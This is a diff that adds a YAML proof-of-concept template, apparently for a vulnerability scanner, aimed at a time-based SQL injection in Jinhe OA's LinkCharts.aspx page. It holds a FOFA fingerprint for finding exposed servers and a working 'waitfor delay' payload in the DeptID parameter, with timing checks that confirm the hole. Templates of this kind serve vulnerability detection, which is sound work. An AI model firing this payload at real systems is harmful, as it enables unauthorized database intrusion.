@@ -1,0 +1,26 @@
+id: poc-yaml-jinhe-oa-linkcharts-sqli
+info:
+  name: 金和OA LinkCharts.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+variables:
+  t1: random_int(3, 5)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /c6/JHSoft.Web.CrmWorkFlat/LinkCharts.aspx/?DeptID=1%27waitfor+delay%270:0:{{.t1}}%27--
+  expression: 'status_code == 200 &&
+
+    duration > t1 &&
+
+    duration < t2 &&
+
+    contains(headers, "X-Aspnet-Version") &&
+
+    body == ""
+
+    '
+transport: http
